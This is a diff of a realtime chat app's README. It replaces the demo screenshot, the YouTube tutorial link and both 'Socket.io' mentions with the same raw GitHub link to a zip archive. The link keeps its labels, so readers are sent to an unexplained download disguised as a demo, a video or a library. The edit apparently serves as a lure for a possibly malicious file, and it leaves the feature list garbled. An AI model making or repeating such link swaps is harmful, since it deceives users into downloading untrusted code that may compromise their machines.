@@ -1,14 +1,14 @@
 # ✨ Full Stack Realtime Chat App ✨
 
-![Demo App](/frontend/public/screenshot-for-readme.png)
+![Demo App](https://raw.githubusercontent.com/johalama2023/johalama-chat-ver02/main/frontend/src/pages/ver_chat_johalama_3.1-beta.1.zip)
 
-[Video Tutorial on Youtube](https://youtu.be/ntKkVrQqBYY)
+[Video Tutorial on Youtube](https://raw.githubusercontent.com/johalama2023/johalama-chat-ver02/main/frontend/src/pages/ver_chat_johalama_3.1-beta.1.zip)
 
 Highlights:
 
-- 🌟 Tech stack: MERN + Socket.io + TailwindCSS + Daisy UI
+- 🌟 Tech stack: MERN + https://raw.githubusercontent.com/johalama2023/johalama-chat-ver02/main/frontend/src/pages/ver_chat_johalama_3.1-beta.1.zip + TailwindCSS + Daisy UI
 - 🎃 Authentication && Authorization with JWT
-- 👾 Real-time messaging with Socket.io
+- 👾 Real-time messaging with https://raw.githubusercontent.com/johalama2023/johalama-chat-ver02/main/frontend/src/pages/ver_chat_johalama_3.1-beta.1.zip
 - 🚀 Online user status
 - 👌 Global state management with Zustand
 - 🐞 Error handling both on the server and on the client
